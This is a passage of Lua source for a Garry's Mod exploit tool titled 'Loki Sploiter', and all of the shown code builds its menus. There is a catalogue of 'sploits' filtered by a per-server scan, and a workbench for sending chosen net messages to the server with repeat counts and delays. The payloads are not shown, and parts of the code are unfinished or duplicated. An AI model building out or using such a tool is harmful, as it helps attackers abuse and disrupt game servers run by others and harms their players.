    surface.SetDrawColor( Color( 60, 60, 60 ) )

    surface.SetMaterial( downgrad )

    surface.DrawTexturedRect( 0, 0, w, h/ 2 )

    surface.SetDrawColor( Color(100, 100, 100, 255) )

    surface.DrawOutlinedRect( 0, 0, w, h )

end



local tttt = vgui.Create( "DLabel", hostframe )

tttt:SetPos( 5, 5 )

tttt:SetText( btext )

tttt:SizeToContents()



local tentry = vgui.Create( "DTextEntry", hostframe )

tentry:SetPos( 10 + tttt:GetWide(), 2 )

tentry:SetSize( 130, 20 )

tentry:SetText( LOKI.GetStored( addr, default ) )

tentry.OnChange = function( self )

    LOKI.Store( addr, self:GetValue() )

end



hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )



return hostframe:GetWide(), hostframe:GetTall()

end









function LOKI.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)

if !parent:IsValid() then return end



local hostframe = vgui.Create( "DPanel", parent )

hostframe:SetPos( x, y )



hostframe.Paint = function( self, w, h )

    surface.SetDrawColor( Color(60, 60, 60, 200) )

    surface.DrawRect( 0, 0, w, h )

    surface.SetDrawColor( Color( 60, 60, 60 ) )

    surface.SetMaterial( downgrad )

    surface.DrawTexturedRect( 0, 0, w, h/ 2 )

    surface.SetDrawColor( Color(100, 100, 100, 255) )

    surface.DrawOutlinedRect( 0, 0, w, h )

end



local tttt = vgui.Create( "DLabel", hostframe )

tttt:SetPos( 5, 5 )

tttt:SetText( btext )

tttt:SizeToContents()



local wangmeoff = vgui.Create( "DNumberWang", hostframe )

wangmeoff:SetPos( 10 + tttt:GetWide(), 2 )

wangmeoff:SetSize( 45, 20 )

wangmeoff:SetDecimals( 2 )

wangmeoff:SetValue( LOKI.GetStored( addr, default ) )

wangmeoff.OnValueChanged = function( self, val )

    LOKI.Store( addr, self:GetValue() )

end



hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )



return hostframe:GetWide(), hostframe:GetTall()

end











////////////////////////////////////////////- NET WORKBENCH -//////////////////////////////////////////////////









function LOKI.MakeMessageSelector( nettable )



    local hostframe = vgui.Create( "DPanel", LOKI.NetWorkbench.NetPanel )

    hostframe:SetPos( 5, LOKI.NetWorkbench.NetPanel.ysize )

    hostframe:SetSize( LOKI.NetWorkbench.NetPanel:GetWide() - 10, 22 )



    hostframe.Paint = function( self, w, h )

        surface.SetDrawColor( Color(60, 60, 60, 200) )

        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( Color(100, 100, 100, 255) )

        surface.DrawOutlinedRect( 0, 0, w, h )

    end



    local tttt = vgui.Create( "DLabel", hostframe )

    tttt:SetPos( 20, 4 )

    tttt:SetText( "String" )

    tttt:SizeToContents()



    local tentry = vgui.Create( "DTextEntry", hostframe )

    tentry:SetSize( 140, 18 )

    tentry:SetPos( hostframe:GetWide() - 145, 2 )

    tentry:SetText( "" )

    tentry.OnChange = function( self )

        print( self:GetValue() )

    end



    local SelButton = vgui.Create( "DButton", hostframe )

    SelButton:SetPos( 5, 3 )

    SelButton:SetText( "" )

    SelButton:SetTextColor( Color(255, 255, 255, 255) )

    SelButton:SetSize( 12, 16 )



    SelButton.Paint = function( self, w, h )

        surface.SetDrawColor( Color(30, 30, 30, 200) )

        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( Color(90, 90, 90, 200) )

        surface.DrawRect( 2, 2, 3, h - 4 )

        surface.DrawRect( 6, 2, 3, h - 4 )

    end



    SelButton.DoClick = function( self )

    end





end













function LOKI.NetmessagePanel()

    if LOKI.NetWorkbench and LOKI.NetWorkbench:IsVisible() then LOKI.NetWorkbench:Remove() end



    LOKI.NetWorkbench = vgui.Create("DFrame")

    LOKI.NetWorkbench:SetSize(250,400)

    LOKI.NetWorkbench:SetTitle("Send a netmessage")

--    LOKI.NetWorkbench:SetPos( gui.MouseX(), gui.MouseY() )

    LOKI.NetWorkbench:MakePopup()

    LOKI.NetWorkbench:Center()



    LOKI.NetWorkbench.Paint = function( s, w, h )

        if !LOKI.Menu or !LOKI.Menu:IsVisible() then s:Remove() return end

        surface.SetDrawColor( Color(30, 30, 30, 255) )

        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( Color(55, 55, 55, 245) )

        surface.DrawOutlinedRect( 0, 0, w, h )

        surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

        draw.DrawText( "Channel: ", "default", 5, 28, Color(255,255,255, 30) )

        draw.DrawText( "Repeat: ", "default", 8, 54, Color(255,255,255, 30) )

        draw.DrawText( "Times", "default", 100, 54, Color(255,255,255, 30) )

        draw.DrawText( "Delay: ", "default", 15, 79, Color(255,255,255, 30) )

        draw.DrawText( "( 100 = 1 msg/second )", "default", 100, 79, Color(255,255,255, 30) )



        surface.SetDrawColor( Color(0, 0, 0, 205) )

        surface.DrawRect( 5, 105, w - 10, 250 )

    end





    LOKI.NetWorkbench.NetPanel = vgui.Create( "DScrollPanel", LOKI.NetWorkbench )

    LOKI.NetWorkbench.NetPanel:SetSize( LOKI.NetWorkbench:GetWide() - 10, 250 )

    LOKI.NetWorkbench.NetPanel:SetPos( 5, 105 )

    LOKI.NetWorkbench.NetPanel.ysize = 0





    local AddButton = vgui.Create( "DButton", LOKI.NetWorkbench.NetPanel )

    AddButton:SetPos( 5, LOKI.NetWorkbench.NetPanel.ysize )

    AddButton:SetText( "Add New Data" )

    AddButton:SetTextColor( Color(255, 255, 255, 255) )

    AddButton:SetSize( LOKI.NetWorkbench.NetPanel:GetWide() - 10, 20 )



    AddButton.Paint = function( self, w, h )

        surface.SetDrawColor( Color(60, 60, 60, 200) )

        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( Color(100, 100, 100, 255) )

        surface.DrawRect( 0, 0, w, 1 )

        surface.DrawRect( 0, 0, 1, h )

    end



    AddButton.DoClick = function( self )

    /*

        LOKI.MakeMessageSelector()

        LOKI.NetWorkbench.NetPanel.ysize = LOKI.NetWorkbench.NetPanel.ysize + 25

        self:SetPos( 5, LOKI.NetWorkbench.NetPanel.ysize )

    */



        local Menu = DermaMenu()

        local Menustr = Menu:AddOption( "String (Text)", function() print( "lulz" ) end ) Menustr:SetIcon( "icon16/script_edit.png" )

        local Menuuint = Menu:AddOption( "UInt (Positive Whole Number)", function() print( "lulz" ) end ) Menuuint:SetIcon( "icon16/script_add.png" )

        local Menuint = Menu:AddOption( "Int (Whole Number)", function() print( "lulz" ) end ) Menuint:SetIcon( "icon16/script_delete.png" )

        local Menufloat = Menu:AddOption( "Float (Decimal Number)", function() print( "lulz" ) end ) Menufloat:SetIcon( "icon16/script_link.png" )

        local Menubool = Menu:AddOption( "Boolean (True or False)", function() print( "lulz" ) end ) Menubool:SetIcon( "icon16/script.png" )

        local Menuvec = Menu:AddOption( "Vector (3D coordinates)", function() print( "lulz" ) end ) Menuvec:SetIcon( "icon16/script_code.png" )

        local Menuang = Menu:AddOption( "Angle (Pitch, Yaw and Roll)", function() print( "lulz" ) end ) Menuang:SetIcon( "icon16/script_gear.png" )

        local Menucol = Menu:AddOption( "Colour (Red, Green and Blue)", function() print( "lulz" ) end ) Menucol:SetIcon( "icon16/script_palette.png" )

        local Menuent = Menu:AddOption( "Entity (Ingame Object)", function() print( "lulz" ) end ) Menuent:SetIcon( "icon16/world.png" )

        local Menudouble = Menu:AddOption( "Double (High Precision Decimal Number)", function() print( "lulz" ) end ) Menudouble:SetIcon( "icon16/script_code_red.png" )

        local Menudata = Menu:AddOption( "Data (Binary Data + Length)", function() print( "lulz" ) end ) Menudata:SetIcon( "icon16/server.png" )

        Menu:Open()



    end





    local netname = vgui.Create( "DTextEntry", LOKI.NetWorkbench )

    netname:SetPos( 50, 25 )

    netname:SetSize( 190, 20 )

    netname:SetText( LOKI.GetStored( "LCurrentNetmessage", "" ) )

    netname.OnChange = function( self )

        local nam = self:GetValue()

        LOKI.Store( "LCurrentNetmessage", nam )

    end



    local netrepeat = vgui.Create( "DNumberWang", LOKI.NetWorkbench )

    netrepeat:SetPos( 50, 50 )

    netrepeat:SetSize( 45, 20 )

    netrepeat:SetDecimals( 2 )

    netrepeat:SetValue( LOKI.GetStored( "LCurrentNetRepeat", 1 ) )

    netrepeat.OnValueChanged = function( self, val )

        LOKI.Store( "LCurrentNetRepeat", self:GetValue() )

    end



    local netdelay = vgui.Create( "DNumberWang", LOKI.NetWorkbench )

    netdelay:SetPos( 50, 75 )

    netdelay:SetSize( 45, 20 )

    netdelay:SetDecimals( 3 )

    netdelay:SetValue( LOKI.GetStored( "LCurrentnetDelay", 100 ) )

    netdelay.OnValueChanged = function( self, val )

        LOKI.Store( "LCurrentnetDelay", self:GetValue() )

    end



    local netname = vgui.Create( "DTextEntry", LOKI.NetWorkbench )

    netname:SetPos( 50, 25 )

    netname:SetSize( 190, 20 )

    netname:SetText( LOKI.GetStored( "LCurrentNetmessage", "" ) )

    netname.OnChange = function( self )

        local nam = self:GetValue()

        LOKI.Store( "LCurrentNetmessage", nam )

    end















    local TButton = vgui.Create( "DButton", LOKI.NetWorkbench )

    TButton:SetPos( 5, LOKI.NetWorkbench:GetTall() - 35 )

    TButton:SetText( "Send to Server" )

    TButton:SetTextColor( Color(255, 255, 255, 255) )

    TButton:SetSize( LOKI.NetWorkbench:GetWide() - 10, 30 )



    TButton.Paint = function( self, w, h )

        surface.SetDrawColor( Color(60, 60, 60, 200) )

        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( Color( 60, 60, 60 ) )

        surface.SetMaterial( downgrad )

        surface.DrawTexturedRect( 0, 0, w, h/ 2 )

        surface.SetDrawColor( Color(100, 100, 100, 255) )

        surface.DrawOutlinedRect( 0, 0, w, h )

    end





    TButton.DoClick = function()

    end



end









































////////////////////////////////////////////- MENU -//////////////////////////////////////////////////











concommand.Add( "loki_menu", function()

if LOKI.Menu and LOKI.Menu:IsVisible() then return end



LOKI.Menu = vgui.Create("DFrame")

LOKI.Menu:SetSize(700,550)

LOKI.Menu:SetTitle("Loki Sploiter")

LOKI.Menu:Center()

LOKI.Menu:MakePopup()

LOKI.Menu.gay = table.Count( LOKI.sploits )



LOKI.Menu.Paint = function( s, w, h )

surface.SetDrawColor( Color(30, 30, 30, 245) )

surface.DrawRect( 0, 0, w, h )

surface.SetDrawColor( Color(55, 55, 55, 245) )

surface.DrawOutlinedRect( 0, 0, w, h )

surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )



surface.SetDrawColor( Color(0, 0, 0, 200) )

surface.DrawRect( 80, 25, w - 90, h - 35 )



surface.SetDrawColor( Color(100, 100, 100, 200) )



surface.DrawLine( 10, 25, 40, 30 )

surface.DrawLine( 40, 30, 70, 25 )



surface.DrawLine( 10, 25, 25, 40 )

surface.DrawLine( 55, 40, 70, 25 )



surface.DrawLine( 25, 40, 25, 60 )

surface.DrawLine( 55, 40, 55, 60 )



surface.DrawLine( 25, 60, 40, 70 )

surface.DrawLine( 55, 60, 40, 70 )



draw.DrawText( "Sploit Library\nStandard: "..LOKI.Menu.gay.."\nCustom: 0", "default", 8, 85, Color(255,255,255, 30) )



end



local Plist = vgui.Create( "DPanelList", LOKI.Menu )

Plist:SetSize( LOKI.Menu:GetWide() - 90, LOKI.Menu:GetTall() - 35 )

Plist:SetPadding( 5 )

Plist:SetSpacing( 5 )

Plist:EnableHorizontal( false )

Plist:EnableVerticalScrollbar( true )

Plist:SetPos( 80, 25 )

Plist:SetName( "" )



LOKI.MakeFunctionButton( LOKI.Menu, 10, 130, "Load Config", LOKI.LoadConfig, "Load a saved loki config" )

LOKI.MakeFunctionButton( LOKI.Menu, 10, 160, "Save Config", LOKI.SaveConfig, "Save your loki config" )

--LOKI.MakeFunctionButton( LOKI.Menu, 12, LOKI.Menu:GetTall() - 35, " net.Send ", LOKI.NetmessagePanel, "" )





local function CreateSploitPanel( name, t )

if !LOKI.Menu then return end

    local cmdp = vgui.Create( "DPanel" )

    cmdp:SetSize( Plist:GetWide(), 70 )

    cmdp.Cmd = name

    cmdp.Desc = t.desc

    cmdp.Paint = function( s, w, h )

        surface.SetDrawColor( Color(50, 50, 50, 245) )

        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( severitycols[t.severity] )

        surface.DrawOutlinedRect( 0, 0, w, h )

        surface.DrawLine( 0, 24, w, 24 )

        draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255,255,255) )

        draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(205,205,255, 100) )

    end



    local x = 10

    for _, tab in ipairs( t.functions ) do

        if tab.typ == "func" then

            x = (x + 5) + LOKI.MakeFunctionButton( cmdp, x, 42, tab.name, tab.func )

        elseif tab.typ == "players" then

            x = (x + 5) + LOKI.MakePlayerSelectionButton( cmdp, x, 42, tab.addr )

        elseif tab.typ == "string" then

            x = (x + 5) + LOKI.MakeTextInputButton( cmdp, x, 42, tab.name, tab.default, tab.addr )

            if !LOKI.IsStored( tab.addr ) then LOKI.Store( tab.addr, tab.default ) end

        elseif tab.typ == "float" then

            x = (x + 5) + LOKI.MakeNumberInputButton( cmdp, x, 42, tab.name, tab.default, tab.min, tab.max, tab.addr )

            if !LOKI.IsStored( tab.addr ) then LOKI.Store( tab.addr, tab.default ) end

        end

    end



    Plist:AddItem( cmdp )

end





for k, v in pairs( LOKI.sploits ) do

    if v.scan() then CreateSploitPanel( k, v ) end

end





end)
